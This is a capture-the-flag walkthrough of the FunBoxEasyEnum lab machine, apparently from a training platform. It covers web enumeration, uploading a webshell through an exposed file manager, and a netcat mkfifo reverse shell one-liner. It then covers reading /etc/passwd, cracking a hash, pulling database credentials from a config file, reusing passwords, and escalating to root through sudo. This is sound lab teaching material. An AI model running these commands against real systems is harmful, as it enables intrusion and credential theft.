# FunBoxEasyEnum

## Nmap

```
sudo nmap 192.168.68.132 -p- -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hitting port 80 we come to an Apache default installation page. Viewing the source of this page reveals no interesting information.

![](<../../../.gitbook/assets/image (1486).png>)

We now move onto enumerating with `dirsearch.py`. First running seclists big.txt against the target.

```
python3 dirsearch.py -u http://192.168.68.132/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -R 2 --full-url -t 75 
```

![](<../../../.gitbook/assets/image (1487).png>)

We view robots.txt and find it contains contains:

```
Allow: Enum_this_Box
```

I ran `dirsearch.py` against this and was unable to find anything further. Viewing `/phpmyadmin` and attempting to login with default credentials shows we are unable to proceed with the default root account.

![](<../../../.gitbook/assets/image (1488).png>)

Running dirsearch.py again on the target this time using the `--suffix` parameter to append .php to all entries we find `/mini.php`.

```
python3 dirsearch.py -u http://192.168.68.132/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -R 2 --full-url -t 75 --suffix=.php 
```

![](<../../../.gitbook/assets/image (1489).png>)

Browsing to `/mini.php` we come to Zerion Mini Shell 1.0. As per below I uploaded a webshell as webshell.php

![](<../../../.gitbook/assets/image (1490).png>)

Knowing that the above files exist in the root directory I then browsed to /webshell.php and was able to execute commands confirming we are running as www-data.

![](<../../../.gitbook/assets/image (1491).png>)

Running the command `which nc` shows we have `netcat` installed on the target machine. I set up a `netcat` listener on my target machine then run the following command on the webshell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.68 80 >/tmp/f
```

Resulting in a reverse shell.

![](<../../../.gitbook/assets/image (1492).png>)

Upgrade the shell:

```
/usr/bin/script -qc /bin/bash /dev/null
```

Checking /etc/passwd shows the user 'oracle' has a password hash in the file.

![](<../../../.gitbook/assets/image (1493) (1).png>)

I then took the hash and run it under mode 500 on `Hashcat` on my Windows host which cracked the password as: **hiphop**

![](<../../../.gitbook/assets/image (1495).png>)

I then used `su` to switch to the user 'oracle' and was successful switching.

![](<../../../.gitbook/assets/image (1496).png>)

After poking about on the oracle user for a bit I could not find anything interesting. I tried the hiphop password against other users and no luck. I decided to move back onto www-data so I can read some files in /etc/phpmyadmin.

I disconnected the shell and run the initial exploit on the web shell to get connect as www-data. Moving into `/etc/phpyadmin` and then reading read the config-db.php file we see credential information.

![](<../../../.gitbook/assets/image (1497).png>)

We find the credentials `phpmyadmin:tgbzhnujm!` I then logged in MySQL and was unable to identify interesting information in the contained databases.

From here I starting throwing the passwords at the users in the `/home/` directory until I got a match on the user 'karla'.

![](<../../../.gitbook/assets/image (1498).png>)

Knowing this worked I excited the shell and logged into `SSH` with the same information just so we have all the advantages of a `SSH` shell.

![](<../../../.gitbook/assets/image (1499).png>)

Checking `sudo -l` we see Karla can run any command as anyone. For a nice easy root shell we can run the command below:

```
sudo /bin/bash
```

![](<../../../.gitbook/assets/image (1500).png>)
